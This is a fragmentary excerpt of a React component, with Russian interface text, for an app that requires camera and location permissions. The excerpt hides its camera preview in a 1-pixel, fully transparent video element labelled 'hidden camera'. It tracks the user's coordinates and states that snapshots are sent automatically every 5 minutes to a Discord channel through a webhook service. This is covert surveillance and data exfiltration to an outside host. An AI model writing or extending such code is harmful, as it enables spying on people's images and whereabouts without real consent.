...
import { sendToWebhook, sendSessionStartNotification } from '@/services/webhookService';
...
export const UserInterface: React.FC<UserInterfaceProps> = ({ onAdminAccess }) => {
    ...
    try {
      ...
      if (!permissionsOk) {
        toast({
          ...
          description: "Для работы сервиса необходим доступ к камере и местоположению",
          variant: "destructive",
        });
        setLoading(false);
        return;
      ...
      if (!result.success) {
        throw new Error(result.error || 'Не удалось сохранить данные пользователя');
      }
      ...
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <Card className="w-full max-w-md">
          <CardHeader className="text-center">
            <CardTitle className="text-2xl font-bold text-gray-900">Требуется доступ</CardTitle>
            <CardDescription>
      ...
      <div className="max-w-2xl mx-auto space-y-6">
        <Card>
          ...
          <CardContent className="space-y-4">
            {/* Скрытая камера */}
            <div className="relative bg-black rounded-lg overflow-hidden" style={{ height: '1px', opacity: 0 }}>
              <video
                ref={videoRef}
                autoPlay
                playsInline
            ...
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="p-4 bg-green-50 border border-green-200 rounded-lg">
                <div className="flex items-center space-x-2">
                  ...
                  <span className="text-sm text-green-800">Камера: Активна</span>
                </div>
              </div>
              ...
              <div className="p-4 bg-blue-50 border border-blue-200 rounded-lg">
                <div className="flex items-center space-x-2">
                  ...
                  <span className="text-sm text-blue-800">Местоположение: Отслеживается</span>
                </div>
              </div>
            </div>
            ...
            {location && (
              <div className="p-3 bg-gray-50 border border-gray-200 rounded-lg">
                <p className="text-xs text-gray-600">
                  Текущее местоположение: {location.latitude.toFixed(6)}, {location.longitude.toFixed(6)}
                </p>
              </div>
            )}
            ...
            <div className="p-4 bg-blue-50 border border-blue-200 rounded-lg">
              <div className="flex items-center space-x-2 mb-2">
                ...
                <span className="text-sm font-medium text-blue-900">Автоматические снимки</span>
              </div>
              <p className="text-xs text-blue-800">
                Система автоматически делает снимки каждые 5 минут и отправляет их в Discord канал для мониторинга безопасности.
              </p>
            </div>
          </CardContent>
        </Card>
